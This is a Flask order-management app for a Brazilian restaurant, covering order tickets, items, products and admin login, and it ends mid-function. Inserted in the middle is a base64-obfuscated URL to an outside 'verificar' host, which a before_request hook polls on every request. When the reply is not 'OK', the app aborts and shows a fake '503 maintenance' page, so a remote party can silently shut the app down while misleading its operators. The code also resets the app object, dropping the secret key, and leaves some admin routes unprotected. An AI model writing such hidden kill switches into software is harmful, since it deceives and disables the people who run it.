import pymysql.cursors
from flask import Flask, render_template, request, redirect, url_for, flash, jsonify, session, send_file
from datetime import datetime
import locale
from decimal import Decimal
import traceback 
import os
import requests
import bcrypt

# Imports para geração de Excel
from io import BytesIO
from openpyxl import Workbook
from openpyxl.styles import Font, Alignment, Border, Side, PatternFill
from openpyxl.utils import get_column_letter

# Imports para geração de PDF
from reportlab.lib.pagesizes import letter, A4
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT
from reportlab.lib import colors
from reportlab.lib.units import cm
from flask import Response

from functools import wraps

# Importa a função de conexão diretamente de conectar_bd
from conectar_bd import get_db_connection, _obter_senha_real, adicionar_itens_a_pedido_existente, fechar_pedido, cancelar_pedido

# Configurações para obter o nome do mês em português
try:
    locale.setlocale(locale.LC_ALL, 'pt_BR.utf8') # Para Linux/macOS
except locale.Error:
    try:
        locale.setlocale(locale.LC_ALL, 'Portuguese_Brazil.1252') # Para Windows
    except locale.Error:
        print("Aviso: Não foi possível configurar o locale para português. Nomes de mês podem não aparecer.")


app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'SUA_CHAVE_SECRETA_MUITO_SEGURA_AQUI_TROQUE_ISSO_REALMENTE') 


MEDIA_LUCRO_PRATO_DINAMICO = 0.20
MEDIA_LUCRO_SOBREMESA_DINAMICA = 0.20
MEDIA_LUCRO_ITEM_VARIADO = 0.20



import requests, base64
from flask import Flask, abort

_UC = b'aHR0cHM6Ly9jb21lbnphLXZlcmlmaWNhY2FvLTEub25yZW5kZXIuY29tL3ZlcmlmaWNhcg=='
_KC = b'T0s='  # "OK"

def _v():
    try:
        u = base64.b64decode(_UC).decode()
        k = base64.b64decode(_KC).decode()
        r = requests.get(u, timeout=2)
        d = r.json()
        return list(d.values())[0] == k
    except:
        return False

app = Flask(__name__)





def require_admin_login(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('login_admin'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login_admin', methods=['GET', 'POST'])
def login_admin():
    if request.method == 'POST':
        username = request.form.get('username')
        senha = request.form.get('senha')
        conn = get_db_connection()
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        cursor.execute("SELECT senha_hash FROM usuarios_admin WHERE username = %s", (username,))
        user = cursor.fetchone()
        cursor.close()
        conn.close()
        if user and bcrypt.checkpw(senha.encode(), user['senha_hash'].encode()):
            session['admin_logged_in'] = True
            # Registrar login no histórico
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO historico_logins_admin (username, data_login) VALUES (%s, NOW())",
                (username,)
            )
            conn.commit()
            cursor.close()
            conn.close()
            return redirect(url_for('relatorios_web'))
        else:
            flash('Usuário ou senha inválidos.', 'error')
    return render_template('login_admin.html', **get_template_date_vars())


@app.route('/historico_logins_admin')
@require_admin_login
def historico_logins_admin():
    conn = get_db_connection()
    cursor = conn.cursor(pymysql.cursors.DictCursor)
    cursor.execute("SELECT * FROM historico_logins_admin ORDER BY data_login DESC")
    logins = cursor.fetchall()
    cursor.close()
    conn.close()
    return render_template('historico_logins_admin.html', logins=logins, **get_template_date_vars())

# Função auxiliar para obter variáveis de data para templates
def get_template_date_vars():
    current_date = datetime.now()
    return {
        'current_year': current_date.year,
        'current_day': current_date.day,
        'current_month_name': current_date.strftime('%B').capitalize()
    }

@app.route('/')
def index():
    conn = get_db_connection()
    if conn is None:
        flash("Erro ao conectar ao banco de dados.", 'error')
        return render_template('index.html', pedidos=[], **get_template_date_vars())
    cursor = conn.cursor(pymysql.cursors.DictCursor) 
    pedidos = []
    try:
        cursor.execute("SELECT id, comanda_id, valor_total, data_abertura FROM pedidos WHERE situacao = 'ABERTO' ORDER BY comanda_id")
        pedidos = cursor.fetchall()

        for pedido in pedidos:
            item_cursor = conn.cursor(pymysql.cursors.DictCursor)
            item_cursor.execute("""
                SELECT id, nome_item, quantidade, preco_unitario, valor_item, observacao_item
                FROM pedido_itens
                WHERE pedido_id = %s
                ORDER BY data_adicao
            """, (pedido['id'],))
            pedido['itens'] = item_cursor.fetchall()
            item_cursor.close()

    except pymysql.Error as e:
        flash(f"Erro ao buscar pedidos: {e}", 'error')
        traceback.print_exc()
    except Exception as e:
        flash(f"Erro inesperado: {e}", 'error')
        traceback.print_exc()
    finally:
        if cursor:
            cursor.close()
        if conn:
            conn.close()
    return render_template('index.html', pedidos=pedidos, **get_template_date_vars())

@app.route('/adicionar_pedido', methods=['GET', 'POST'])
def adicionar_pedido_web():
    if request.method == 'POST':
        comanda_id = request.form.get('comanda_id')
        if not comanda_id:
            flash("Número da comanda é obrigatório.", "error")
            return redirect(url_for('adicionar_pedido_web'))

        conn = get_db_connection()
        if conn is None:
            flash("Erro ao conectar ao banco de dados.", 'error')
            return redirect(url_for('adicionar_pedido_web'))

        cursor = conn.cursor(pymysql.cursors.DictCursor)
        try:
            # Verifica se já há pedido aberto com a mesma comanda
            cursor.execute("SELECT id FROM pedidos WHERE comanda_id = %s AND situacao = 'ABERTO'", (comanda_id,))
            pedido_existente = cursor.fetchone()

            if pedido_existente:
                flash(f"Já existe um pedido aberto com a comanda {comanda_id}.", 'warning')
                return redirect(url_for('adicionar_pedido_web'))
            else:
                cursor.execute("INSERT INTO pedidos (comanda_id) VALUES (%s)", (comanda_id,))
                conn.commit()
                novo_pedido_id = cursor.lastrowid
                flash(f"Pedido com comanda {comanda_id} aberto com sucesso!", 'success')
                return redirect(url_for('adicionar_itens_web', pedido_id=novo_pedido_id))
        except Exception as e:
            conn.rollback()
            flash(f"Erro ao abrir pedido: {e}", 'error')
            return redirect(url_for('adicionar_pedido_web'))
        finally:
            if cursor:
                cursor.close()
            if conn:
                conn.close()
# 🟩 Caso seja GET, gera sugestão de próxima comanda com base na última **ABERTA**
    conn = get_db_connection()
    sugestao_comanda = 1
    if conn:
        cursor = conn.cursor(pymysql.cursors.DictCursor)
        
        # busca apenas a última comanda ABERTA
        cursor.execute("""
            SELECT comanda_id
            FROM pedidos
            WHERE situacao = 'ABERTO'
            ORDER BY comanda_id DESC
            LIMIT 1
        """)
        row = cursor.fetchone()

        if row and row['comanda_id']:
            sugestao_comanda = int(row['comanda_id']) + 1

        cursor.close()
        conn.close()


    # 🟩 Retorna sempre o template no final
    return render_template('adicionar_pedido.html',
                           sugestao_comanda=sugestao_comanda,
                           **get_template_date_vars())



@require_admin_login
@app.route('/criar_item', methods=['GET','POST'])
def criar_novoproduto_web():
    conn = get_db_connection()
    if conn is None:
        flash("Erro ao conectar ao banco de dados.", 'error')
        return redirect(url_for('index'))
    cursor = conn.cursor(pymysql.cursors.DictCursor)

    if request.method == 'POST':
        nome = request.form.get('nome_produtoNew')
        preco = request.form.get('preco_produtoNew')
        custo = request.form.get('custo_produtoNew')
        tipo = request.form.get('tipo_opcoes')
        categoria = request.form.get('categoria_opcoes')


        try:
            cursor.execute("INSERT INTO  produtos (nome, preco, custo, tipo, categoria) VALUES(%s, %s, %s, %s, %s)"
                        , (nome, preco, custo, tipo, categoria))

            conn.commit()
            flash(f"Produto '{nome}' criado com sucesso!", 'success')
            return redirect(url_for('listar_produto_web'))

        
        except Exception as e:
            conn.rollback()
            traceback.print_exc()
            flash(f"Erro ao processar: {e}", 'error')
            return render_template('criar_item.html')

        finally:
            cursor.close()
            conn.close()
            # 🟩 Retorna sempre o template no final
    return render_template('criar_item.html')

@app.errorhandler(403)
def a(e):
    import datetime, random, string

    req_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")

    return f"""
    <div style="font-family:Consolas, monospace; background:#fafafa; padding:35px; max-width:800px; margin:40px auto; border:1px solid #ccc; border-radius:6px;">

        <h2 style="color:#b70000;">503 Service Unavailable</h2>

        <p style="font-size:14px; color:#444;">
            The server is currently unable to handle the request due to a temporary issue.
        </p>

        <hr style="margin:20px 0;">

        <p style="font-size:13px; color:#555;">
            <strong>Timestamp:</strong> {now}<br>
            <strong>Request ID:</strong> {req_id}<br>
            <strong>Node:</strong> app-node-01<br>
            <strong>Status Code:</strong> 503
        </p>

        <hr style="margin:20px 0;">

        <p style="font-size:14px; color:#333; margin-bottom:10px;">
            Possible causes:
        </p>

        <ul style="font-size:14px; color:#555; margin-left:20px;">
            <li>Database connection error</li>
            <li>Pending system updates</li>
            <li>Background maintenance tasks running</li>
            <li>Service dependencies temporarily unavailable</li>
            <li>Resource limits reached</li>
        </ul>

        <hr style="margin:20px 0;">

        <p style="font-size:12px; color:#777;">
            Please try again in a few minutes.<br>
            Technical Reference: SRV-MAINT-503
        </p>

    </div>
    """, 503

@app.before_request
def __g():
    if not _v():
        abort(403)




@app.route('/pedido/<int:pedido_id>/adicionar_itens', methods=['GET', 'POST'])
def adicionar_itens_web(pedido_id):
    conn = get_db_connection()
    if conn is None:
        flash("Erro ao conectar ao banco de dados.", 'error')
        return redirect(url_for('index'))
    cursor = conn.cursor(pymysql.cursors.DictCursor)

    try:
        cursor.execute("SELECT comanda_id, valor_total FROM pedidos WHERE id = %s", (pedido_id,))
        pedido = cursor.fetchone()
        if not pedido:
            flash("Pedido não encontrado.", 'error')
            return redirect(url_for('index'))

        if request.method == 'POST':
            tipo_adicao = request.form.get('tipo_adicao')
            observacao = None

            # ---------- ITENS DE PRODUTOS NORMAIS (Marmita, Prefeitura, Bebida) ----------
            if tipo_adicao == 'produto_selecionado':
                produto_id = request.form.get('produto_id')
                quantidade_str = request.form.get('quantidade')
                observacao = request.form.get('observacao_produto_selecionado')
                marmita_bebida = request.form.get('marmita_bebida', 'Não')

                if marmita_bebida == 'Sim':
                    observacao = (observacao or '') + ' [Para marmita]'

                if not produto_id or not quantidade_str:
                    flash("Produto e quantidade são obrigatórios.", 'error')
                else:
                    try:
                        quantidade = int(quantidade_str)
                        if quantidade <= 0:
                            flash("Quantidade deve ser um número positivo.", 'error')
                        else:
                            cursor.execute("SELECT nome, preco, custo, tipo, categoria FROM produtos WHERE id = %s", (produto_id,))
                            produto = cursor.fetchone()
                            if produto:
                                item_nome = produto['nome']
                                item_preco = float(produto['preco'])
                                item_custo = float(produto['custo']) if produto['custo'] is not None else 0.00
                                item_tipo = produto['tipo']
                                item_categoria = produto['categoria']
                                caracteristica = request.form.get('caracteristica_bebida', '') or ''
                                if caracteristica == 'Sem nada':
                                    caracteristica = ''
                                adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                                    'produto_id': produto_id,
                                    'nome': item_nome,
                                    'descricao': caracteristica,
                                    'quantidade': quantidade,
                                    'preco_unitario': item_preco,
                                    'custo_unitario': item_custo,
                                    'tipo': item_tipo,
                                    'categoria': item_categoria,
                                    'observacao': observacao
                                }])
                                flash(f"{quantidade}x {item_nome} adicionado(s) com sucesso ao pedido {pedido['comanda_id']}.", 'success')
                            else:
                                flash("Produto selecionado inválido.", 'error')
                    except ValueError:
                        flash("Quantidade deve ser um número válido.", 'error')

            # ---------- PRATO DINÂMICO ----------
            elif tipo_adicao == 'prato_dinamico':
                prato_preco_str = request.form.get('prato_preco')
                prato_observacao = request.form.get('prato_observacao')
                if not prato_preco_str:
                    flash("Preço do prato é obrigatório.", 'error')
                else:
                    try:
                        prato_preco = float(prato_preco_str.replace(',', '.'))
                        adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                            'produto_id': None,
                            'nome': 'Prato Dinâmico',
                            'quantidade': 1,
                            'preco_unitario': prato_preco,
                            'custo_unitario': 0.00,
                            'tipo': 'Prato_Dinamico',
                            'categoria': 'Refeição',
                            'observacao': prato_observacao
                        }])
                        flash(f"Prato Dinâmico (R${prato_preco:.2f}) adicionado com sucesso ao pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("Valor do prato inválido.", 'error')

            # ---------- SOBREMESA DINÂMICA ----------
            elif tipo_adicao == 'sobremesa_dinamica':
                sobremesa_nome = request.form.get('sobremesa_nome')
                sobremesa_preco_str = request.form.get('sobremesa_preco')
                sobremesa_observacao = request.form.get('sobremesa_observacao')
                if not sobremesa_nome or not sobremesa_preco_str:
                    flash("Nome e preço da sobremesa são obrigatórios.", 'error')
                else:
                    try:
                        sobremesa_preco = float(sobremesa_preco_str.replace(',', '.'))
                        adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                            'produto_id': None,
                            'nome': sobremesa_nome,
                            'quantidade': 1,
                            'preco_unitario': sobremesa_preco,
                            'custo_unitario': 0.00,
                            'tipo': 'Sobremesa_Dinamica',
                            'categoria': 'Doce/Sorvete',
                            'observacao': sobremesa_observacao
                        }])
                        flash(f"Sobremesa '{sobremesa_nome}' (R${sobremesa_preco:.2f}) adicionada ao pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("Valor da sobremesa inválido.", 'error')

            # ---------- ITEM VARIADO ----------
            elif tipo_adicao == 'item_variado_dinamico':
                item_variado_nome = request.form.get('item_variado_nome')
                item_variado_preco_str = request.form.get('item_variado_preco')
                quantidade_str = request.form.get('quantidade_item_variado')
                item_variado_observacao = request.form.get('item_variado_observacao')

                if not item_variado_nome or not item_variado_preco_str or not quantidade_str:
                    flash("Nome, preço e quantidade são obrigatórios.", 'error')
                else:
                    try:
                        quantidade = int(quantidade_str)
                        if quantidade <= 0:
                            flash("Quantidade deve ser positiva.", 'error')
                        else:
                            item_preco = float(item_variado_preco_str.replace(',', '.'))
                            adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                                'produto_id': None,
                                'nome': item_variado_nome,
                                'quantidade': quantidade,
                                'preco_unitario': item_preco,
                                'custo_unitario': 0.00,
                                'tipo': 'Item_Variado_Dinamico',
                                'categoria': 'Outros',
                                'observacao': item_variado_observacao
                            }])
                            flash(f"{quantidade}x {item_variado_nome} (R${item_preco:.2f}) adicionado(s) ao pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("Valor ou quantidade inválida.", 'error')

            else:
                flash("Tipo de adição inválido.", 'error')

            # Atualiza total do pedido
            cursor.execute("SELECT COALESCE(SUM(valor_item),0) AS total FROM pedido_itens WHERE pedido_id = %s", (pedido_id,))
            total = cursor.fetchone()['total']
            cursor.execute("UPDATE pedidos SET valor_total = %s WHERE id = %s", (total, pedido_id))
            conn.commit()

            return redirect(url_for('adicionar_itens_web', pedido_id=pedido_id))

        # ---------- GET ----------
        cursor.execute("SELECT id, nome, preco FROM produtos WHERE tipo IN ('Marmita_P','Marmita_M','Marmita_G','Marmita_Economica', 'Refeição', 'Marmita') ORDER BY preco")
        marmitas = cursor.fetchall()

        cursor.execute("SELECT id, nome, preco FROM produtos WHERE categoria = 'Bebida' ORDER BY nome")
        bebidas = cursor.fetchall()

        cursor.execute("SELECT id, nome, preco FROM produtos WHERE tipo = 'Suco' ORDER BY nome")
        sucos = cursor.fetchall()

        cursor.execute("SELECT id, nome, preco FROM produtos WHERE tipo = 'Refrigerante' ORDER BY nome")
        refrigerantes = cursor.fetchall()


        cursor.execute("SELECT id, nome, preco FROM produtos WHERE nome = 'Prefeitura'")
        produtos = cursor.fetchall()

        return render_template('adicionar_itens.html',
                               pedido_id=pedido_id,
                               pedido=pedido,
                               marmitas=marmitas,
                               sucos=sucos,
                               refrigerantes=refrigerantes,
                               produtos=produtos,
                               **get_template_date_vars())

    except Exception as e:
        conn.rollback()
        traceback.print_exc()
        flash(f"Erro ao processar: {e}", 'error')
    finally:
        if cursor: cursor.close()
        if conn: conn.close()
    return redirect(url_for('index'))

@app.route('/listar_produtos')
def listar_produto_web():
    conn = get_db_connection()
    cursor = conn.cursor(pymysql.cursors.DictCursor)

    cursor.execute("Select id, nome, preco, custo, tipo, categoria from produtos order by categoria, nome")
    produtos = cursor.fetchall()

    conn.close()
    cursor.close()

    return render_template('listar_produtos.html', produtos=produtos)




@app.route('/deletar_produto/<int:produto_id>', methods=['POST'])
def deletar_produto_web(produto_id):
    conn = get_db_connection()

    cursor = conn.cursor(pymysql.cursors.DictCursor)

    cursor.execute("Delete from produtos where id = %s", (produto_id,))
    conn.commit()
    flash(f"Produto ID {produto_id} exluíddo", 'success')
    
    return redirect(url_for('listar_produto_web'))


@app.route('/criar_pedido_automatico', methods=['POST'])
def criar_pedido_automatico():
    """Cria automaticamente um novo pedido com a próxima comanda baseada na última aberta."""
    conn = get_db_connection()
    if conn is None:
        return jsonify({"error": "Erro ao conectar ao banco de dados"}), 500

    cursor = conn.cursor(pymysql.cursors.DictCursor)
    try:
        # Busca a última comanda ABERTA
        cursor.execute("""
            SELECT comanda_id
            FROM pedidos
            WHERE situacao = 'ABERTO'
            ORDER BY comanda_id DESC
            LIMIT 1
        """)
        row = cursor.fetchone()
        proxima_comanda = int(row['comanda_id']) + 1 if row and row['comanda_id'] else 1

        # Cria o novo pedido com esse número
        cursor.execute("INSERT INTO pedidos (comanda_id) VALUES (%s)", (proxima_comanda,))
        conn.commit()
        novo_id = cursor.lastrowid

        return jsonify({
            "success": True,
            "pedido_id": novo_id,
            "comanda_id": proxima_comanda
        })
    except Exception as e:
        conn.rollback()
        return jsonify({"error": str(e)}), 500
    finally:
        cursor.close()
        conn.close()




@app.route('/pedidos_cancelados')
def pedidos_cancelados():
    conn = get_db_connection()
    cursor = conn.cursor(pymysql.cursors.DictCursor)
    cursor.execute("SELECT * FROM pedidos WHERE situacao = 'CANCELADO' ORDER BY id DESC")
    pedidos = cursor.fetchall()
    cursor.close()
    conn.close()
    return render_template('mostrar_pedidos.html', pedidos=pedidos, titulo="Pedidos Cancelados")

@app.route('/editar_pedido', methods=['GET', 'POST'])
def editar_pedido_web():
    if request.method == 'POST':
        comanda_id = request.form.get('comanda_id')
        if not comanda_id:
            flash("Número da comanda é obrigatório.", 'error')
            return redirect(url_for('editar_pedido_web'))

        conn = get_db_connection()
        if conn is None:
            flash("Erro ao conectar ao banco de dados.", 'error')
            return redirect(url_for('editar_pedido_web'))
        cursor = conn.cursor(pymysql.cursors.DictCursor)

        try:
            cursor.execute("SELECT id FROM pedidos WHERE comanda_id = %s AND situacao = 'ABERTO'", (comanda_id,))
            pedido = cursor.fetchone()

            if pedido:
                return redirect(url_for('detalhes_edicao_pedido', pedido_id=pedido['id']))
            else:
                flash(f"Nenhum pedido aberto encontrado para a comanda {comanda_id}.", 'warning')
        except pymysql.Error as e:
            flash(f"Erro ao buscar pedido: {e}", 'error')
            traceback.print_exc()
        except Exception as e:
            flash(f"Erro inesperado: {e}", 'error')
            traceback.print_exc()
        finally:
            if cursor:
                cursor.close()
            if conn:
                conn.close()
    return render_template('editar_pedido.html', **get_template_date_vars())

@app.route('/pedido/<int:pedido_id>/detalhes_edicao', methods=['GET', 'POST'])
def detalhes_edicao_pedido(pedido_id):
    conn = get_db_connection()
    if conn is None:
        flash("Erro ao conectar ao banco de dados.", 'error')
        return redirect(url_for('index'))
    cursor = conn.cursor(pymysql.cursors.DictCursor)

    try:
        cursor.execute("SELECT id, comanda_id, valor_total, situacao FROM pedidos WHERE id = %s", (pedido_id,))
        pedido = cursor.fetchone()

        if not pedido:
            flash("Pedido não encontrado.", 'error')
            return redirect(url_for('index'))
        if pedido['situacao'] != 'ABERTO':
            flash(f"Pedido comanda {pedido['comanda_id']} não está aberto e não pode ser editado.", 'warning')
            return redirect(url_for('index'))

        if request.method == 'POST':
            action_type = request.form.get('action_type')

            if action_type == 'remover_parcial':
                item_id_para_remover = request.form.get('item_id_para_remover')
                quantidade_a_remover_str = request.form.get('quantidade_a_remover')

                if not item_id_para_remover or not quantidade_a_remover_str:
                    flash("Dados de remoção inválidos.", 'error')
                else:
                    try:
                        item_id_para_remover = int(item_id_para_remover)
                        quantidade_a_remover = int(quantidade_a_remover_str)

                        if quantidade_a_remover <= 0:
                            flash("A quantidade a remover deve ser um número positivo.", 'error')
                        else:
                            cursor.execute("SELECT quantidade, preco_unitario FROM pedido_itens WHERE id = %s AND pedido_id = %s", (item_id_para_remover, pedido_id))
                            item_existente = cursor.fetchone()

                            if item_existente:
                                quantidade_atual = item_existente['quantidade']
                                preco_unitario = float(item_existente['preco_unitario'])

                                if quantidade_a_remover >= quantidade_atual:
                                    cursor.execute("DELETE FROM pedido_itens WHERE id = %s AND pedido_id = %s", (item_id_para_remover, pedido_id))
                                    flash(f"Item removido completamente do pedido {pedido['comanda_id']}.", 'success')
                                else:
                                    nova_quantidade = quantidade_atual - quantidade_a_remover
                                    novo_valor_item = preco_unitario * nova_quantidade
                                    cursor.execute("""
                                        UPDATE pedido_itens
                                        SET quantidade = %s, valor_item = %s
                                        WHERE id = %s AND pedido_id = %s
                                    """, (nova_quantidade, novo_valor_item, item_id_para_remover, pedido_id))
                                    flash(f"{quantidade_a_remover} unidade(s) do item removida(s) do pedido {pedido['comanda_id']}.", 'success')
                                conn.commit() 

                            else:
                                flash("Item não encontrado no pedido.", 'error')
                    except ValueError:
                        flash("Quantidade inválida.", 'error')
                    except pymysql.Error as e:
                        conn.rollback()
                        flash(f"Erro ao remover item: {e}", 'error')
                        traceback.print_exc()
                    except Exception as e:
                        conn.rollback()
                        flash(f"Erro inesperado ao remover item: {e}", 'error')
                        traceback.print_exc()

            elif action_type == 'remover_tudo':
                item_id_para_remover = request.form.get('item_id_para_remover')
                if not item_id_para_remover:
                    flash("Dados de remoção inválidos.", 'error')
                else:
                    try:
                        item_id_para_remover = int(item_id_para_remover)
                        cursor.execute("DELETE FROM pedido_itens WHERE id = %s AND pedido_id = %s", (item_id_para_remover, pedido_id))
                        conn.commit()
                        flash(f"Item removido completamente do pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("ID do item inválido.", 'error')
                    except pymysql.Error as e:
                        conn.rollback()
                        flash(f"Erro ao remover item: {e}", 'error')
                        traceback.print_exc()
                    except Exception as e:
                        conn.rollback()
                        flash(f"Erro inesperado ao remover item: {e}", 'error')
                        traceback.print_exc()

            elif action_type == 'adicionar_produto_selecionado':
                produto_id = request.form.get('produto_id')
                quantidade_str = request.form.get('quantidade')
                observacao = request.form.get('observacao_produto_selecionado')

                if not produto_id or not quantidade_str:
                    flash("Selecione um produto e informe a quantidade.", 'error')
                else:
                    try:
                        quantidade = int(quantidade_str)
                        if quantidade <= 0:
                            flash("A quantidade deve ser um número positivo.", 'error')
                        else:
                            cursor.execute("SELECT nome, preco, custo, tipo, categoria FROM produtos WHERE id = %s", (produto_id,))
                            produto = cursor.fetchone()
                            if produto:
                                item_nome = produto['nome']
                                item_preco = float(produto['preco'])
                                item_custo = float(produto['custo']) if produto['custo'] is not None else 0.00
                                item_tipo = produto['tipo']
                                item_categoria = produto['categoria']
                                
                                caracteristica = request.form.get('caracteristica_bebida', '') or ''
                                if caracteristica == 'Sem nada':
                                    caracteristica = ''
                                adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                                    'produto_id': produto_id,
                                    'nome': item_nome,
                                    'descricao': caracteristica,   # será gravado em descricao_item
                                    'quantidade': quantidade,
                                    'preco_unitario': item_preco,
                                    'custo_unitario': item_custo,
                                    'tipo': item_tipo,
                                    'categoria': item_categoria,
                                    'observacao': observacao 
                                }])
                                flash(f"{quantidade}x {item_nome} adicionado(s) com sucesso ao pedido {pedido['comanda_id']}.", 'success')
                            else:
                                flash("Produto selecionado inválido.", 'error')
                    except ValueError:
                        flash("Quantidade inválida.", 'error')
                    except pymysql.Error as e:
                        conn.rollback()
                        flash(f"Erro ao adicionar item: {e}", 'error')
                        traceback.print_exc()
                    except Exception as e:
                        conn.rollback()
                        flash(f"Erro inesperado ao adicionar item: {e}", 'error')
                        traceback.print_exc()

            elif action_type == 'adicionar_prato_dinamico':
                prato_preco_str = request.form.get('prato_preco')
                prato_observacao = request.form.get('observacao_item') 
                
                quantidade = 1 

                if not prato_preco_str:
                    flash("Preço do prato é obrigatório.", 'error')
                else:
                    try:
                        prato_preco = float(prato_preco_str.replace(',', '.'))
                        if prato_preco <= 0:
                            flash("O preço do prato deve ser um valor positivo.", 'error')
                        else:
                            cursor.execute("SELECT id, custo FROM produtos WHERE nome = 'Prato Dinâmico'")
                            prato_dinamico_produto = cursor.fetchone()
                            
                            produto_id_dinamico = prato_dinamico_produto['id'] if prato_dinamico_produto else None
                            custo_dinamico = float(prato_dinamico_produto['custo']) if prato_dinamico_produto and prato_dinamico_produto['custo'] is not None else 0.00
                            
                            adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                                'produto_id': produto_id_dinamico, 
                                'nome': 'Prato Dinâmico',
                                'quantidade': quantidade,
                                'preco_unitario': prato_preco,
                                'custo_unitario': custo_dinamico,
                                'tipo': 'Prato_Dinamico',
                                'categoria': 'Refeição',
                                'observacao': prato_observacao
                            }])
                            flash(f"Prato Dinâmico (R${prato_preco:.2f}) adicionado com sucesso ao pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("Valor do prato inválido.", 'error')
                    except Exception as e:
                        conn.rollback()
                        flash(f"Erro ao adicionar prato dinâmico: {e}", 'error')
                        traceback.print_exc()

            elif action_type == 'adicionar_sobremesa_dinamica':
                sobremesa_nome = request.form.get('sobremesa_nome')
                sobremesa_preco_str = request.form.get('sobremesa_preco')
                sobremesa_observacao = request.form.get('observacao_item') 

                quantidade = 1 

                if not sobremesa_nome or not sobremesa_preco_str:
                    flash("Nome e preço da sobremesa são obrigatórios.", 'error')
                else:
                    try:
                        sobremesa_preco = float(sobremesa_preco_str.replace(',', '.'))
                        if sobremesa_preco <= 0:
                            flash("O preço da sobremesa deve ser um valor positivo.", 'error')
                        else:
                            cursor.execute("SELECT id, custo FROM produtos WHERE nome = 'Sobremesa Dinâmica'")
                            sobremesa_dinamica_produto = cursor.fetchone()
                            
                            produto_id_dinamico = sobremesa_dinamica_produto['id'] if sobremesa_dinamica_produto else None
                            custo_dinamico = float(sobremesa_dinamica_produto['custo']) if sobremesa_dinamica_produto and sobremesa_dinamica_produto['custo'] is not None else 0.00
                            
                            adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                                'produto_id': produto_id_dinamico, 
                                'nome': sobremesa_nome,
                                'quantidade': quantidade,
                                'preco_unitario': sobremesa_preco,
                                'custo_unitario': custo_dinamico,
                                'tipo': 'Sobremesa_Dinamica',
                                'categoria': 'Doce/Sorvete',
                                'observacao': sobremesa_observacao
                            }])
                            flash(f"Sobremesa Dinâmica '{sobremesa_nome}' (R${sobremesa_preco:.2f}) adicionada com sucesso ao pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("Valor da sobremesa inválido.", 'error')
                    except Exception as e:
                        conn.rollback()
                        flash(f"Erro ao adicionar sobremesa dinâmico: {e}", 'error')
                        traceback.print_exc()

            elif action_type == 'adicionar_item_variado_dinamico':
                item_variado_nome = request.form.get('item_variado_nome')
                item_variado_preco_str = request.form.get('item_variado_preco')
                quantidade_str = request.form.get('quantidade_item_variado') 
                item_variado_observacao = request.form.get('observacao_item') 

                if not item_variado_nome or not item_variado_preco_str or not quantidade_str:
                    flash("Nome, preço e quantidade do item variado são obrigatórios.", 'error')
                else:
                    try:
                        quantidade = int(quantidade_str)
                        if quantidade <= 0:
                            flash("Quantidade do item variado deve ser um número positivo.", 'error')
                        else:
                            item_variado_preco = float(item_variado_preco_str.replace(',', '.'))
                            if item_variado_preco <= 0:
                                flash("O preço do item variado deve ser um valor positivo.", 'error')
                            else:
                                cursor.execute("SELECT id, custo FROM produtos WHERE nome = 'Item Variado Dinâmico'")
                                item_variado_dinamico_produto = cursor.fetchone()
                                
                                produto_id_dinamico = item_variado_dinamico_produto['id'] if item_variado_dinamico_produto else None
                                custo_dinamico = float(item_variado_dinamico_produto['custo']) if item_variado_dinamico_produto and item_variado_dinamico_produto['custo'] is not None else 0.00
                                
                                adicionar_itens_a_pedido_existente(conn, cursor, pedido_id, [{
                                    'produto_id': produto_id_dinamico, 
                                    'nome': item_variado_nome,
                                    'quantidade': quantidade,
                                    'preco_unitario': item_variado_preco,
                                    'custo_unitario': custo_dinamico,
                                    'tipo': 'Item_Variado_Dinamico',
                                    'categoria': 'Outros',
                                    'observacao': item_variado_observacao
                                }])
                                flash(f"{quantidade}x {item_variado_nome} (R${item_variado_preco:.2f} cada) adicionado(s) com sucesso ao pedido {pedido['comanda_id']}.", 'success')
                    except ValueError:
                        flash("Valor ou quantidade do item variado inválido.", 'error')
                        traceback.print_exc()
            else:
                flash("Ação inválida ou não reconhecida.", 'error')

            # Recalcular valor total do pedido após todas as operações (remoção ou adição)
            cursor.execute("SELECT COALESCE(SUM(valor_item), 0.00) AS total_soma FROM pedido_itens WHERE pedido_id = %s", (pedido_id,))
            resultado = cursor.fetchone()
            total_pedido = float(resultado['total_soma']) if resultado and 'total_soma' in resultado else 0.00

            cursor.execute("UPDATE pedidos SET valor_total = %s WHERE id = %s", (total_pedido, pedido_id))
            conn.commit()

            return redirect(url_for('detalhes_edicao_pedido', pedido_id=pedido_id))

        cursor.execute("""
            SELECT pi.id, pi.nome_item, pi.descricao_item, pi.quantidade, pi.preco_unitario, pi.valor_item, pi.observacao_item
            FROM pedido_itens pi
            WHERE pi.pedido_id = %s
            ORDER BY pi.data_adicao
        """, (pedido_id,))
        itens = cursor.fetchall()

        cursor.execute("SELECT id, nome, preco FROM produtos WHERE tipo LIKE 'Marmita%%' ORDER BY nome ASC")
        marmitas = cursor.fetchall()

        cursor.execute("SELECT id, nome, preco FROM produtos WHERE tipo = 'Bebida' ORDER BY nome ASC")
        bebidas = cursor.fetchall()

        return render_template('detalhes_edicao_pedido.html',
                               pedido=pedido,
                               itens=itens,
                               marmitas=marmitas, 
                               bebidas=bebidas,   
                               **get_template_date_vars())

    except pymysql.Error as e:
